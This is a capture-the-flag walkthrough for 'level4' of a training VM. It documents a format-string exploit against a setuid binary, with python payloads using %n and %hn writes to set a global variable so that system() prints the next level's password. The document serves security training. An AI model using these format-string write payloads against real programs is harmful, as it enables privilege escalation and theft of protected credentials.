# Level4 — Commands

## Connection

```bash
ssh level4@localhost -p 4242
```

Password: (in `level3/flag`)

---

## Recon

```bash
pwd
ls -la
file level4
readelf -h level4
```

Extraction (from the host):
`sshpass -p '<level4_password>' scp -o StrictHostKeyChecking=no -P 4242 level4@localhost:level4 ./level4.bin`

See `analysis.md`.

---

## Exploitation

**Format string** vulnerability: `printf(buffer)`. The variable **m** (0x8049810) must equal **0x1025544** (16930116) for **system("/bin/cat /home/user/level5/.pass")** to be executed.

**Validated solution (official ISO, index 12):**

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4
```

Wait 10–30 s; the level5 password appears at the end. If the index differs on another VM, see below.

### 0. On the official ISO: verify the address of `m`

The address may differ from a local extraction. On the VM:

```bash
objdump -t level4 | grep " m$"
# or
readelf -s level4 | grep " m "
```

Note the address (e.g. `08049810`). In little endian: if it is 0x8049810 → `\x10\x98\x04\x08`; if it is 0x8049890 → `\x90\x98\x04\x08`, etc.

### 1. Find the correct index

**Stack dump** (extend to 12 if needed):

```bash
python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p"' | ./level4
```

Identify the index that displays **0x41414141** (the "AAAA"): that is the pointer to the buffer. On the official ISO it is **%12$p** → use **%12$n**.

**Step B — Verify with a small write (avoids segfault)**

Write **64** to `m` instead of 16930116. If the index is correct, no segfault (the program just won't call `system` since 64 ≠ 0x1025544). If the index is wrong, segfault.

Test **each** index manually (replace **K** with 1, 2, 3, 4, 5, 6, 7, 8):

```bash
python -c 'print "\x10\x98\x04\x08" + "%60x%K$n"' | ./level4
```

The one that does **not** give "Segmentation fault" is the correct one. If **%1$n** segfaults (as on your VM), try **2**, **6**, **8** (stack addresses from the dump):

```bash
python -c 'print "\x10\x98\x04\x08" + "%60x%2$n"' | ./level4
python -c 'print "\x10\x98\x04\x08" + "%60x%6$n"' | ./level4
python -c 'print "\x10\x98\x04\x08" + "%60x%8$n"' | ./level4
```

### 2. Run the payload with this index

The output is ~16 MB; a simple `| tail -1` may cause **Input/output error** (pipe saturated). It is better to **redirect to a file**, then read the end:

```bash
# Replace K with the index (usually 4 or 7)
python -c 'print "\x10\x98\x04\x08" + "%16930112x%K$n"' | ./level4 > /tmp/out 2>&1
tail -1 /tmp/out
```

If the dump shows **0x41414141** at a certain index (e.g. **%12$p**), that index is the **pointer to the buffer**: use **%12$n** (replace 12 with the found index). On the official ISO the buffer may be at index **12**. Test the **full payload** with this index — the binary (setuid level5) should execute `system("/bin/cat /home/user/level5/.pass")` and display the password. You cannot read the file manually (Permission denied as level4).

**Your dump: %12$p = 0x41414141** → the buffer is at index **12**. Use **%12$n**:

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4
```

(Wait 10–30 s. Level5 password at the end.) If needed, also try **%8$n** or **%2$n**. If neither 8 nor 2 gives the password, try writing in **two parts** with **%hn** (see below).

---

### Alternative: two-part write with %hn

If a single **%n** is not enough, we can write **0x1025544** as two half-words: **0x0102** to address **0x8049812** and **0x5544** to **0x8049810**. We need **two** arguments pointing to the start of the buffer (buffer and buffer+4). First identify two consecutive indices that look like addresses 4 bytes apart (buffer, buffer+4):

```bash
python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p"' | ./level4
```

If for example **%8$p** and **%9$p** give two addresses differing by 4 (e.g. 0xbffff550 and 0xbffff554), then buffer = arg8, buffer+4 = arg9. Payload: the two addresses first (0x8049812, 0x8049810), then write 258 (0x0102) with **%8$hn**, then 21828−258 = 21570 more bytes and **%9$hn** (writes 0x5544 to 0x8049810):

```bash
python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08" + "%250x%8$hn%21570x%9$hn"' | ./level4
```

(Adjust indices 8 and 9 if the dump shows buffer / buffer+4 at different positions.)

If `tail -1 /tmp/out` gives "Input/output error", try: `tail -c 100 /tmp/out` or `cat /tmp/out | tail -1`. The password is at the end of the file.

This may take 10–30 seconds (writing ~16 MB). The level5 password is on the last line of `/tmp/out`. If disk space is limited: `rm -f /tmp/out` afterwards.

**If with index 2 the output ends with "b7ff26b0" and no password:** we are not writing to `m` (writing elsewhere), so `system()` is not called. The write must go into `m` via the argument that points to your buffer (where the 4 bytes 0x8049810 are). Try with **only argument 1** for the padding and **%n**, to avoid touching argument 2:

```bash
python -c 'print "\x10\x98\x04\x08" + "%1$16930112x%1$n"' | ./level4
```

(Wait 10–30 s; do not redirect to a file to see the end.) The level5 password should appear at the very end. If segfault, the binary or VM may not allow this exploitation; document index 2 and the observed behavior.

### Observed behavior on this VM

- **%1$n** (and **%1$16930112x%1$n**) → **Segmentation fault**.
- **%2$n** → no segfault, but the output ends with **"b7ff26b0"** (no password): the write does not go to `m`, so `system()` is not called.
- **%4$n, %6$n, %7$n, %8$n** → segfault.

**Conclusion:** If even on the official ISO you get a segfault with **%1$n**: (1) verify the address of `m` (step 0) and use it in little endian in the payload; (2) find the index that **does not segfault** with the small write (`%60x%K$n` for K = 1 to 8); (3) use **that** index with the address found in (1). If all indices segfault with the small write, the binary or environment may differ; document in the walkthrough the intended exploit (format string → write 0x1025544 to `m` → system("/bin/cat ...")).

---

## Retrieving the level5 password

The program executes `/bin/cat /home/user/level5/.pass`: the password is the last line displayed. Record it in `level4/flag`.
